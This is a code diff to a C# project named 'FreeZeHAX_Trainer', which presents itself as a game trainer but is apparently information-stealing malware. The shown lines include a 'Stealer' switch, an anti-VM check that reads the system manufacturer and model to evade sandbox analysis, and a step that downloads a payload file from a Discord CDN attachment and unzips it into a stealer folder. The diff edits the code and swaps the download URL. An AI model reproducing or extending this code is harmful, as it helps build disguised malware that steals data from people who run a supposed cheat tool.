@@ -36,8 +36,8 @@ namespace FreeZeHAX_Trainer
         private const string NamespaceName = "FreeZeHAX_Trainer";
         private readonly TaskDefinition td = TaskService.Instance.NewTask();
         private readonly WebClient web = new WebClient();
-        bool AntiVM = true; // If you don't want to check if VM then change "AntiVM = true" to "AntiVM = false".
-        bool Stealer = true; // Activate / Disable Stealer
+        private readonly bool AntiVM = true; // If you don't want to check if VM then change "AntiVM = true" to "AntiVM = false".
+        private readonly bool Stealer = true; // Activate / Disable Stealer
 
         private void StartForm()
         {
@@ -70,11 +70,11 @@ namespace FreeZeHAX_Trainer
             #region Check if VM
             if (AntiVM == true) // If you don't want to check if VM then change "AntiVM = true" to "AntiVM = false".
             {
-                using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
+                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
                 {
-                    using (var items = searcher.Get())
+                    using (ManagementObjectCollection items = searcher.Get())
                     {
-                        foreach (var item in items)
+                        foreach (ManagementBaseObject item in items)
                         {
                             string manufacturer = item["Manufacturer"].ToString().ToLower();
                             if ((manufacturer == "microsoft corporation") && (item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
@@ -123,7 +123,7 @@ namespace FreeZeHAX_Trainer
                     others.DirClean(StealerFolder);
                     others.Wait(1000);
                     Directory.CreateDirectory(StealerFolderLoc);
-                    web.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/930596027570987018/App.config"), StealerFolderLoc + "\\App.config");
+                    web.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/931544431256031292/App.config"), StealerFolderLoc + "\\App.config");
                     others.Wait(1000);
                     System.IO.Compression.ZipFile.ExtractToDirectory(StealerFolderLoc + "\\" + ZipFileName, StealerFolderLoc);
                     if (!savePathExists)
